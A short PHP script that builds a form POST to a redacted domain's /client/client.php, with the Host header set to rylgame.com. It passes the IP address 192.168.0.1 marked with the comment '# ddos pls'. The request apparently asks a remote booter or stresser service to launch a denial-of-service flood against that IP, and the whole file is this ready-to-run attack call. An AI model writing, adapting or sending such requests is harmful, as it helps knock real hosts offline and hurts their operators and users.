```
<?php

$client = new http\Client;
$request = new http\Client\Request;

$body = new http\Message\Body;
$body->append(new http\QueryString([
  'data1' => 'ops',
  'data2' => 'ops',
  'data3' => '192.168.0.1', # ddos pls
  'data4' => '0'
]));

$request->setRequestUrl('https://<>.com/client/client.php');
$request->setRequestMethod('POST');
$request->setBody($body);

$request->setHeaders([
  'host' => 'rylgame.com',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded'
]);

$client->enqueue($request)->send();
$response = $client->getResponse();

echo $response->getBody();
```
